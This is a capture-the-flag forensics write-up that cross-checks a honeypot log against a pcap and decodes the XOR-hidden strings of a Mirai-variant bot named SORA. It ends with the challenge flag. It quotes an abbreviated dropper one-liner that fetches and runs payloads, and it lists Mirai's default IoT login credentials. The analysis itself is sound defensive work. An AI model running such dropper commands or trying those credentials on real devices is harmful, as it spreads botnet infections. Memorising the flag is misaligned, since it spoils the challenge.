# Robben's

| Category | Difficulty | Points | Author |
|---|---|---|---|
| DFIR | Medium | 100 | odytr |

> The sensor log and the pcap don't seem to agree, so the lawyer doesn't trust either one by itself. The endpoint agent also caught one of the payloads, a file called robben, and deleted it. The only thing left is a dump of its read-only data section.

**Flag:** `RxR{UTC+5_156688_0x54_SORA}`

Files: `cowrie.json` (honeypot sensor log), `capture.pcap`, `robben.rodata.bin` (2 KB).

> ⚠️ The commands in the log are real Mirai dropper commands. I only parsed the files and never executed anything from them.

## The story in the sensor log

An SSH login as `root/admin` from a Go client is followed by a classic Mirai-style dropper one-liner: `cd /tmp; wget/curl phantom.sh; sh phantom.sh; tftp ...`, then per-architecture builds `phantom.x86`, `phantom.mips` and `phantom.mpsl` over HTTP, with FTP as a fallback. Some fetches are marked `file_download.failed`.

## Q1: What UTC offset is the sensor clock really using?

| Source | SSH connect |
|---|---|
| pcap (wire time) | 2026-07-23 **23:47:54** UTC |
| Attacker server's `Date:` header | `Thu, 23 Jul 2026 23:48:38 GMT` |
| Cowrie log | 2026-07-24 **04:47:54Z** |

Cowrie labels its timestamps `Z`, but they're exactly **+5:00** ahead of both independent UTC sources. **Answer: `UTC+5`.**

## Q2: How many bytes of payload builds did the sensor actually receive?

Every download reuses one of two HTTP keep-alive connections, so I reassembled each TCP stream by sequence number (no gaps, no retransmissions) and split it into request/response pairs:

| Request | Content-Length | Received | Via |
|---|---|---|---|
| `/phantom.sh` ×2 | 6,799 | 6,799 each | wget / curl (script, not a build) |
| `/bins/phantom.x86` ×2 | 24,828 | 24,828 each | wget / curl |
| `/bins/phantom.mips` ×2 | 26,236 | 26,236 each | wget / curl |
| `/bins/phantom.mpsl` ×2 | 27,280 | 27,280 each | wget / curl |
| FTP fallbacks ×3 | n/a | 0 (`530 Login incorrect`) | |

This is where the two sources disagree. Cowrie marks one `phantom.x86` fetch as **failed**, but on the wire **every HTTP transfer completed**. Only the FTP fallbacks failed. Counting every build transfer:

```
2 × (24,828 + 26,236 + 27,280) = 156,688
```

**Answer: `156688`.**

## Q3: Which single-byte key hides robben's strings?

The dump holds the plaintext C2 address `198.51.100.7`, followed by two blocks of high-entropy strings. Every encrypted string in the second block ends in `T` (`0x54`). Mirai string tables are NUL-terminated, and NUL XOR key equals the key, so the key is **`0x54`**. Decoding with it gives:

- **Credential table:** `default`, `root`, `xc3551`, `7ujMko0admin`, `hi3518`, `admin1234`, `ubnt`, ...
- **Bot table:** `/bin/busybox SORA`, `SORA: applet not found`, `/proc/net/tcp`, `/dev/watchdog`, `Source Engine Query`, ...

## Q4: What does the bot call itself?

Mirai checks that it has a shell by running a fake busybox applet named after the bot (`/bin/busybox SORA`) and looking for `SORA: applet not found`. **Answer: `SORA`**, a known Mirai fork.

## Solve

```
$ python3 solve.py capture.pcap cowrie.json robben.rodata.bin
sensor 04:47:54Z vs wire 23:47:54 UTC -> sensor clock is UTC+5
...
payload-build bytes received: 156688
xor key 0x54; bot name: SORA

RxR{UTC+5_156688_0x54_SORA}
```

## Lessons

- A sensor's "Z" is only a label. Anchor time on the wire and on independent headers such as HTTP `Date:`.
- "Failed" in an application log doesn't mean no bytes arrived. The pcap is the ground truth for what was received.
- With single-byte XOR over NUL-terminated strings, the terminator gives the key away.
